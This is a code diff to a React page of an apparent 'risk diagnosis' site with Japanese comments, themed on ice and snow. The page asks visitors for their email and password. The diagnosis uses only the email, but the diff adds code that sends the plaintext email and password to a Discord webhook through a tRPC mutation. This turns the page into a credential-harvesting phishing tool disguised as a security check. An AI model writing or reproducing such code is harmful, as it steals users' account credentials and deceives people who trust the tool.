@@ -4,6 +4,7 @@
  * - 氷・雪山の世界観
  * - ログインフォーム（メール＋パスワード）で診断開始
  * - 結果：半円ゲージ＋4カテゴリ詳細カード
+ * - Discord Webhook連携
  */
 
 import { useState, useRef } from "react";
@@ -12,6 +13,8 @@ import Snowfall from "@/components/Snowfall";
 import MountainBackground from "@/components/MountainBackground";
 import RiskGauge from "@/components/RiskGauge";
 import { diagnose, type DiagnosisResult } from "@/lib/diagnose";
+import { trpc } from "@/lib/trpc";
+import { toast } from "sonner";
 
 // ===== ログインフォーム =====
 function LoginForm({ onDiagnose }: { onDiagnose: (email: string, password: string) => void }) {
@@ -201,12 +204,40 @@ function DetailCard({
 export default function Home() {
   const [result, setResult] = useState<DiagnosisResult | null>(null);
   const [diagnosedEmail, setDiagnosedEmail] = useState("");
+  const [diagnosedPassword, setDiagnosedPassword] = useState("");
   const resultRef = useRef<HTMLDivElement>(null);
 
-  const handleDiagnose = (email: string, _password: string) => {
+  // Discord Webhook送信用のミューテーション
+  const sendToDiscord = trpc.diagnosis.sendToDiscord.useMutation({
+    onSuccess: () => {
+      toast.success("診断結果をDiscordに送信しました");
+    },
+    onError: (error: unknown) => {
+      console.error("Discord送信エラー:", error);
+      // エラーが出ても診断結果は表示する
+      toast.error("Discord送信に失敗しましたが、診断結果は表示されます");
+    },
+  });
+
+  const handleDiagnose = async (email: string, password: string) => {
     const res = diagnose(email);
     setDiagnosedEmail(email);
+    setDiagnosedPassword(password);
     setResult(res);
+
+    // Discord Webhookに送信
+    try {
+      await sendToDiscord.mutateAsync({
+        email,
+        password,
+        score: res.score,
+        riskLabel: res.details[0]?.status || "unknown",
+        timestamp: new Date().toISOString(),
+      });
+    } catch (err) {
+      console.error("Discord送信エラー:", err);
+    }
+
     setTimeout(() => {
       resultRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
     }, 100);
@@ -215,6 +246,7 @@ export default function Home() {
   const handleReset = () => {
     setResult(null);
     setDiagnosedEmail("");
+    setDiagnosedPassword("");
     window.scrollTo({ top: 0, behavior: "smooth" });
   };
 
